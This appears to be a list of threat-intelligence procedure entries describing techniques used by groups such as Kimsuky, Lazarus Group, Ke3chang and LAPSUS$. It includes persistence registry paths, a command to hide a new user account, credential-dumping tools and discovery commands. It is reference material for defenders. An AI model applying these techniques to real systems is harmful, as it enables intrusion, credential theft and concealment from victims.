Higaisa’s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the &lt;code&gt;OINFO12.OCX&lt;/code&gt; dynamic link library.
Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.
Higaisa used Base64 encoded compressed payloads.
Higaisa exfiltrated data over its C2 channel.
Higaisa has exploited CVE-2018-0798 for execution.
Higaisa used a payload that creates a hidden window.
Higaisa discovered system proxy settings and used them if available.
Higaisa used JavaScript to execute additional files.
Higaisa used malicious e-mail attachments to lure victims into executing LNK files.
Higaisa named a shellcode loader binary &lt;code&gt;svchast.exe&lt;/code&gt; to spoof the legitimate &lt;code&gt;svchost.exe&lt;/code&gt;.
Higaisa has called various native OS APIs.
Higaisa’s shellcode attempted to find the process ID of the current process.
Higaisa used a FakeTLS session for C2 communications.
Higaisa added a spoofed binary to the start-up folder for persistence.
Higaisa dropped and added &lt;code&gt;officeupdate.exe&lt;/code&gt; to scheduled tasks.
Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.
Higaisa has sent spearphishing emails containing malicious attachments.
Higaisa used AES-128 to encrypt C2 traffic.
Higaisa collected the system volume serial number, GUID, and computer name.
Higaisa used &lt;code&gt;ipconfig&lt;/code&gt; to gather network configuration information.
Higaisa used a function to gather the current time.
Higaisa has used VBScript code on the victim's machine.
Higaisa used HTTP and HTTPS to send data back to its C2 server.
Higaisa used &lt;code&gt;cmd.exe&lt;/code&gt; for execution.
Higaisa used an XSL file to run VBScript code.
Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.
Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.
Inception has used specific malware modules to gather domain membership.
Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.
Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.
Inception used a file listing plugin to collect information about file and directories both on local and remote drives.
Inception lured victims into clicking malicious files for machine reconnaissance and to execute malware.
Inception has used malicious HTA files to drop and execute malware.
Inception used chains of compromised routers to proxy C2 communications between them and cloud service providers.
Inception has used PowerShell to execute malicious commands and payloads.
Inception has used a reconnaissance module to identify active processes and other associated loaded modules.
Inception has maintained persistence by modifying Registry run key value 
 &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\&lt;/code&gt;.
Inception has ensured persistence at system boot by setting the value &lt;code&gt;regsvr32 %path%\ctfmonrn.dll /s&lt;/code&gt;.
Inception has enumerated installed software on compromised systems.
Inception has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.
Inception has encrypted network communications with AES.
Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.
Inception has used decoy documents to load malicious remote payloads via HTTP.
Inception has obtained and used open-source tools such as LaZagne.
Inception has used VBScript to execute malicious commands and payloads.
Inception has used HTTP, HTTPS, and WebDav in network communications.
Inception has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.
IndigoZebra has established domains, some of which were designed to look like official government domains, for their operations.
IndigoZebra has compromised legitimate email accounts to use in their spearphishing operations.
IndigoZebra has downloaded additional files and tools from its C2 server.
IndigoZebra sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.
IndigoZebra sent spearphishing emails containing malicious password-protected RAR attachments.
IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations.
IndigoZebra created Dropbox accounts for their operations.
Indrik Spider has used Cobalt Strike to empty log files.
Indrik Spider used &lt;code&gt;wmic.exe&lt;/code&gt; to add a new user to the system.
Indrik Spider has encrypted domain-controlled systems using BitPaymer.
Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.
Indrik Spider has collected credentials from infected systems, including domain accounts.
Indrik Spider has created email accounts to communicate with their ransomware victims, to include providing payment and decryption details.
Indrik Spider has used Group Policy Objects to deploy batch scripts.
Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host.
Indrik Spider has used malicious JavaScript files for several components of their attack.
Indrik Spider used Cobalt Strike to carry out credential dumping using ProcDump.
Indrik Spider has stored collected date in a .tmp file.
Indrik Spider has attempted to get users to click on a malicious zipped file.
Indrik Spider has developed malware for their operations, including ransomware such as BitPaymer and WastedLocker.
Indrik Spider used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.
Indrik Spider has used PowerShell Empire for execution of malware.
Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.
Indrik Spider has served fake updates via legitimate websites that have been compromised.
Indrik Spider has used PsExec to stop services prior to the execution of ransomware.
Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system.
Indrik Spider has used batch scripts on victim's machines.
Indrik Spider has used WMIC to execute commands on remote computers.
The Ke3chang group has been known to compress data before exfiltration.
Ke3chang is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration.
Ke3chang has performed frequent and scheduled data collection from victim networks.
Ke3chang has performed  frequent and scheduled data exfiltration from compromised networks.
Ke3chang has used compromised credentials to sign into victims’ Microsoft 365 accounts.
Malware used by Ke3chang can run commands on the command-line interface.
Ke3chang malware RoyalDNS has used DNS for C2.
Ke3chang gathered information and files from local directories for exfiltration.
Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them.
Ke3chang performs account discovery using commands such as &lt;code&gt;net localgroup administrators&lt;/code&gt; and &lt;code&gt;net group "REDACTED" /domain&lt;/code&gt; on specific permissions groups.
Ke3chang performs discovery of permission groups &lt;code&gt;net group /domain&lt;/code&gt;.
Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.
Ke3chang has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers.
Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates.
Ke3chang uses command-line interaction to search files and directories.
Ke3chang has used Mimikatz to generate Kerberos golden tickets.
Ke3chang has used tools to download files to compromised machines.
Ke3chang has used keyloggers.
Ke3chang has dumped credentials, including by using gsecdump.
Ke3chang has dumped credentials, including by using Mimikatz.
Ke3chang performs account discovery using commands such as &lt;code&gt;net localgroup administrators&lt;/code&gt; and &lt;code&gt;net group "REDACTED" /domain&lt;/code&gt; on specific permissions groups.
Ke3chang has developed custom malware that allowed them to maintain persistence on victim networks.
Ke3chang has dropped their malware into legitimate installed software paths including: `C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe`, `C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe`, `C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe`, and `C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe`.
Ke3chang has used NTDSDump and other password dumping tools to gather credentials.
Ke3chang has used Base64-encoded shellcode strings.
Ke3chang performs process discovery using &lt;code&gt;tasklist&lt;/code&gt; commands.
Several Ke3chang backdoors achieved persistence by adding a Run key.
Ke3chang has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes.
Ke3chang has used network scanning and enumeration tools, including Ping.
Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.
Ke3chang actors have been known to copy files to the network shares of other computers to move laterally.
Ke3chang has dumped credentials, including by using gsecdump.
Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries.
Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember.
Ke3chang performs operating system information discovery using &lt;code&gt;systeminfo&lt;/code&gt; and has used implants to identify the system language and computer name.
Ke3chang has used implants to collect the system language ID of a compromised machine.
Ke3chang has performed local network configuration discovery using &lt;code&gt;ipconfig&lt;/code&gt;.
Ke3chang performs local network connection discovery using &lt;code&gt;netstat&lt;/code&gt;.
Ke3chang has used implants capable of collecting the signed-in username.
Ke3chang performs service discovery using &lt;code&gt;net start&lt;/code&gt; commands.
Ke3chang has obtained and used tools such as Mimikatz.
Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.
Ke3chang malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.
Ke3chang has used batch scripts in its malware to install persistence mechanisms.
Ke3chang backdoor RoyalDNS established persistence through adding a service called &lt;code&gt;Nwsapagent&lt;/code&gt;.
Kimsuky has added accounts to specific groups with &lt;code&gt;net localgroup&lt;/code&gt;.
Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.
Kimsuky has used RC4 encryption before exfil.
Kimsuky has used QuickZip to archive stolen files before exfiltration.
Kimsuky has used Blogspot pages for C2.
Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.
Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents.
Kimsuky has signed files with the name EGIS CO,. Ltd..
Kimsuky has used tools that are capable of obtaining credentials from saved mail.
Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers. Kimsuky has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims.
Kimsuky has collected Office, PDF, and HWP documents from its victims.
Kimsuky has decoded malicious VBScripts using Base64.
Kimsuky created and used a mailing toolkit to use in spearphishing attacks.
Kimsuky has been observed disabling the system firewall.
Kimsuky has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.
Kimsuky has registered domains to spoof targeted organizations and trusted third parties.
Kimsuky has compromised legitimate sites and used them to distribute malware.
Kimsuky has compromised email accounts to send spearphishing e-mails.
Kimsuky has created email accounts for phishing operations.
Kimsuky has collected valid email addresses that were subsequently used in spearphishing campaigns.
Kimsuky has set auto-forward rules on victim's e-mail accounts.
Kimsuky has collected victim employee name information.
Kimsuky has exfiltrated data over its C2 channel.
Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts.
Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.
Kimsuky has obtained exploit code for various CVEs.
Kimsuky has used RDP to establish persistence.
Kimsuky has deleted the exfiltrated data on disk after transmission. Kimsuky has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.
Kimsuky has used FTP to download additional malware to the target machine.
Kimsuky has the ability to enumerate all files and directories on an infected system.
Kimsuky has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others.
Kimsuky has run &lt;code&gt;reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v&lt;/code&gt; to hide a newly created user.
Kimsuky has used an information gathering module that will hide an AV software window from the victim.
Kimsuky has downloaded additional scripts, tools, and malware onto victim systems.
Kimsuky has sent internal spearphishing emails for lateral movement after stealing victim information.
Kimsuky has used JScript for logging and downloading additional tools.
Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.
Kimsuky has gathered credentials using Mimikatz and ProcDump.
Kimsuky has created accounts with &lt;code&gt;net user&lt;/code&gt;.
Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.
Kimsuky has staged collected data files under &lt;code&gt;C:\Program Files\Common Files\System\Ole DB\&lt;/code&gt;.
Kimsuky has used e-mail to send exfiltrated data to C2 servers.
Kimsuky has used attempted to lure victims into opening malicious e-mail attachments.
Kimsuky has lured victims into clicking malicious links.
Kimsuky has developed its own unique malware such as MailFetch.py for use in operations.
Kimsuky has disguised services to appear as benign software or related to operating system functions.
Kimsuky has renamed malware to legitimate names such as &lt;code&gt;ESTCommon.dll&lt;/code&gt; or &lt;code&gt;patch.dll&lt;/code&gt;.
Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence.
Kimsuky has used mshta.exe to run malicious scripts on the system.
Kimsuky has used a proprietary tool to intercept one time passwords required for two-factor authentication.
Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.
Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding. Kimsuky has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format.
Kimsuky has used pass the hash for authentication to remote access software used in C2.
Kimsuky has executed a variety of PowerShell scripts.
Kimsuky can gather a list of all processes running on a victim's machine.
Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.
Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.
Kimsuky has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.
Kimsuky has obtained specific Registry keys and values on a compromised host.
Kimsuky has placed scripts in the startup folder for persistence and modified the `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce` Registry key.
Kimsuky has executed malware with &lt;code&gt;regsvr32s&lt;/code&gt;.
Kimsuky has used a modified TeamViewer client as a command and control channel.
Kimsuky has used RDP for direct remote point-and-click access.
Kimsuky has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP.
Kimsuky has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.
Kimsuky has downloaded additional malware with scheduled tasks.
Kimsuky has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims.
Kimsuky has searched for information on the target company's website.
Kimsuky has checked for the presence of antivirus software with &lt;code&gt;powershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct&lt;/code&gt;.
Kimsuky has purchased hosting servers with virtual currency and prepaid cards.
Kimsuky has used Twitter to monitor potential victims and to prepare targeted phishing e-mails.
Kimsuky has created social media accounts to monitor news and security trends as well as potential targets.
Kimsuky has packed malware with UPX.
Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.
Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.
Kimsuky has used links in e-mail to steal account information.
Kimsuky has enumerated drives, OS type, OS version, and other information using a script or the "systeminfo" command.
Kimsuky has used `ipconfig/all` to gather network configuration information.
Kimsuky has used an instrumentor script to gather the names of all services running on a victim's system.
Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics.
Kimsuky has obtained and used tools such as Nirsoft WebBrowserPassVIew, Mimikatz, and PsExec.
Kimsuky has used Blogspot to host malicious content such as beacons, file exfiltrators, and implants.
Kimsuky has used Visual Basic to download malicious payloads. Kimsuky has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure.
Kimsuky  has used HTTP GET and POST requests for C2.
Kimsuky has hosted content used for targeting efforts via web services such as Blogspot.
Kimsuky has used modified versions of open source PHP web shells to maintain access, often adding "Dinosaur" references within the code.
Kimsuky has executed Windows commands by using `cmd` and running batch scripts.
Kimsuky has created new services for persistence.
LAPSUS$ has removed a targeted organization's global admin accounts to lock the organization out of all access.
LAPSUS$ has added the global admin role to accounts they have created in the targeted organization's cloud instances.
LAPSUS$ has gathered detailed knowledge of an organization's supply chain relationships.
LAPSUS$ has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement.
LAPSUS$ has created global admin accounts in the targeted organization's cloud instances to gain persistence.
LAPSUS$ has used compromised credentials to access cloud assets within a target organization.
LAPSUS$ has searched public code repositories for exposed credentials.
LAPSUS$ has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials.
LAPSUS$ has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials.
LAPSUS$ has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets.
LAPSUS$ has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials.
LAPSUS$ has obtained passwords and session tokens with the use of the Redline password stealer.
LAPSUS$ has used DCSync attacks to gather credentials for privilege escalation routines.
LAPSUS$ has reconfigured a victim's DNS records to actor-controlled domains and websites.
LAPSUS$ has deleted the target's systems and resources both on-premises and in the cloud.
LAPSUS$ has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials.
LAPSUS$ uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release.
LAPSUS$ has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process.
LAPSUS$ has used the AD Explorer tool to enumerate users on a victim's network.
LAPSUS$ has used the AD Explorer tool to enumerate groups on a victim's network.
LAPSUS$ has payed employees, suppliers, and business partners of target organizations for credentials.
LAPSUS$ has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts.
LAPSUS$ has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account.
LAPSUS$ has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation.
LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix.
LAPSUS$ has gathered detailed information of target employees to enhance their social engineering lures.
LAPSUS$ has gathered detailed knowledge of team structures within a target organization.
LAPSUS$ has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts.
LAPSUS$ acquired and used the Redline password stealer in their operations.
LAPSUS$ has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval.
LAPSUS$ has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval.
LAPSUS$ has used Windows built-in tool `ntdsutil` to extract the Active Directory (AD) database.
LAPSUS$ has accessed local password managers and databases to obtain further credentials from a compromised network.
LAPSUS$ has leverage NordVPN for its egress points when targeting intended victims.
LAPSUS$ has purchased credentials and session tokens from criminal underground forums.
LAPSUS$ has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure.
LAPSUS$ has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials.
LAPSUS$ has called victims' help desk to convince the support personnel to reset a privileged account’s credentials.
LAPSUS$ has obtained tools such as RVTools and AD Explorer for their operations.
LAPSUS$ has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations.
LAPSUS$ has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing LAPSUS$ to take control of an authenticated system.
LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.
LAPSUS$ has used VPS hosting providers for infrastructure.
Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.
Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.
Lazarus Group has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2.
A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.
Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.
Lazarus Group has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories.
Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.
Lazarus Group has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility.
Lazarus Group has digitally signed malware and utilities to evade detection.
Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call &lt;code&gt;CreateProcessAsUserA&lt;/code&gt; under that user's context.
Lazarus Group has replaced `win_fw.dll`, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload.
Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory.
Lazarus Group has collected data and files from compromised networks.
Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.
Lazarus Group has obtained SSL certificates for their C2 domains.
Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh.
Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services..
Lazarus Group has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.
Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.
Lazarus Group has acquired domains related to their campaigns to act as distribution points and C2 channels.
Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website.
Lazarus Group has used a custom hashing method to resolve APIs used in shellcode.
A Lazarus Group malware sample performs reflective DLL injection.
Lazarus Group has created new email accounts for spearphishing operations.
Lazarus Group collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.
Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.
Lazarus Group has exfiltrated data and files over a C2 channel through its various tools and malware.
Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.
Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.
Lazarus Group has used multiple proxies to obfuscate network traffic from victims.
Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.
Lazarus Group malware has deleted files in various ways, including "suicide scripts" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.
Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.
Lazarus Group has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.
Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.
Lazarus Group has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked.
Lazarus Group persistence mechanisms have used &lt;code&gt;forfiles.exe&lt;/code&gt; to execute .htm files.
Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host.
Lazarus Group replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe.
Lazarus Group has used a compromised router to serve as a proxy between a victim network's corporate and restricted segments.
Lazarus Group has abused the &lt;code&gt;KernelCallbackTable&lt;/code&gt; to hijack process control flow and execute shellcode.
Lazarus Group malware KiloAlfa contains keylogging functionality.
Lazarus Group executed Responder using the command &lt;code&gt;[Responder file path] -i [IP address] -rPv&lt;/code&gt; on a compromised host to harvest credentials and move laterally.
Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.
Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.
Lazarus Group has developed custom malware for use in their operations.
Lazarus Group has used a scheduled task named `SRCheck` to mask the execution of a malicious .dll.
Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.
Lazarus Group has used &lt;code&gt;mshta.exe&lt;/code&gt; to execute HTML pages downloaded by initial access documents.
Lazarus Group has used multi-stage malware components that inject later stages into separate processes.
Lazarus Group has used the Windows API &lt;code&gt;ObtainUserAgentString&lt;/code&gt; to obtain the User-Agent from a compromised host to connect to a C2 server. Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.
Lazarus Group has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.
Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.
Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.
Lazarus Group has used PowerShell to execute commands and malicious code.
Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.
Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption.
Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:&lt;code&gt;HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt&lt;/code&gt;.
Lazarus Group has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via KernelCallbackTable hijacking. Lazarus Group has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.
Lazarus Group has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.
Lazarus Group malware SierraCharlie uses RDP for propagation.
Lazarus Group has renamed system utilities such as &lt;code&gt;wscript.exe&lt;/code&gt; and &lt;code&gt;mshta.exe&lt;/code&gt;.
Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.
Lazarus Group malware SierraAlfa accesses the &lt;code&gt;ADMIN$&lt;/code&gt; share via SMB to conduct lateral movement.
Lazarus Group used SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network.
Lazarus Group has used &lt;code&gt;schtasks&lt;/code&gt; for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.
Lazarus Group has compromised servers to stage malicious tools.
Lazarus Group has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.
Lazarus Group malware has maintained persistence on a system by creating a LNK shortcut in the user’s Startup folder.
Lazarus Group has created new Twitter accounts to conduct social engineering against potential victims.
Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.
Lazarus Group has sent malicious links to victims via email.
Lazarus Group has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.
A Lazarus Group malware sample encodes data with base64.
Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads. Lazarus Group has also used AES to encrypt C2 traffic.
Lazarus Group lnk files used for persistence have abused the Windows Update Client (&lt;code&gt;wuauclt.exe&lt;/code&gt;) to execute a malicious DLL.
Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.
Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.
Lazarus Group has used &lt;code&gt;net use&lt;/code&gt; to identify and establish a network connection with a remote host.
Various Lazarus Group malware enumerates logged-on users.
Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems.
A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server.
Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.
Lazarus Group has obtained a variety of tools for their operations, including Responder and PuTTy PSCP.
Lazarus Group has used administrator credentials to gain access to restricted network segments.
Lazarus Group has used VBA and embedded macros in Word documents to execute malicious code.
Lazarus Group has conducted C2 over HTTP and HTTPS.
Lazarus Group has hosted malicious downloads on Github.
Lazarus Group malware uses cmd.exe to execute commands on a compromised host. A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.
Lazarus Group has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.
Several Lazarus Group malware families install themselves as new services.
LazyScripter has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques.
LazyScripter has leveraged dynamic DNS providers for C2 communications.
LazyScripter has used dynamic DNS providers to create legitimate-looking subdomains for C2.
LazyScripter had downloaded additional tools to a compromised host.
LazyScripter has used JavaScript in its attacks.
LazyScripter has lured users to open malicious email attachments.
LazyScripter has relied upon users clicking on links to malicious files.
LazyScripter has used a variety of open-source remote access Trojans for its operations.
LazyScripter has used several different security software icons to disguise executables.
LazyScripter has used `mshta.exe` to execute Koadic stagers.
LazyScripter has used PowerShell scripts to execute malicious code.
LazyScripter has achieved persistence via writing a PowerShell script to the autorun registry key.
LazyScripter has used `rundll32.exe` to execute Koadic stagers.
LazyScripter has used spam emails weaponized with archive or document files as its initial infection vector.
LazyScripter has used spam emails that contain a link that redirects the victim to download a malicious document.
LazyScripter has hosted open-source remote access Trojans used in its operations in GitHub.
LazyScripter has used VBScript to execute malicious code.
LazyScripter has used GitHub to host its payloads to operate spam campaigns.
LazyScripter has established GitHub accounts to host its toolsets.
LazyScripter has used batch files to deploy open-source and multi-stage RATs.
Leafminer used several tools for retrieving login and password information, including LaZagne.
Leafminer obfuscated scripts that were used on victim machines.
Leafminer used several tools for retrieving login and password information, including LaZagne.
Leafminer used several tools for retrieving login and password information, including LaZagne.
Leafminer used several tools for retrieving login and password information, including LaZagne.
Leafminer has infected victims using watering holes.
Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.
Leafminer infected victims using JavaScript code.
Leafminer used several tools for retrieving login and password information, including LaZagne.
Leafminer used several tools for retrieving login and password information, including LaZagne and Mimikatz.
Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine.
Leafminer scanned network services to search for vulnerabilities in the victim system.
Leafminer used a tool called Total SMB BruteForcer to perform internal password spraying.
Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems.
Leafminer used a tool called MailSniper to search through the Exchange server mailboxes for keywords.
Leafminer used Microsoft’s Sysinternals tools to gather detailed information about remote systems.
Leafminer has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper.
Leviathan has archived victim's data prior to exfiltration.
Leviathan has used BITSAdmin to download additional tools.
Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection.
Leviathan has used stolen code signing certificates to sign malware.
Leviathan has collected compromised credentials to use for targeting efforts.
Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.
Leviathan has established domains that impersonate legitimate entities to use for targeting efforts.
Leviathan has infected victims using watering holes.
Leviathan has utilized OLE as a method to insert malicious content inside various phishing documents.
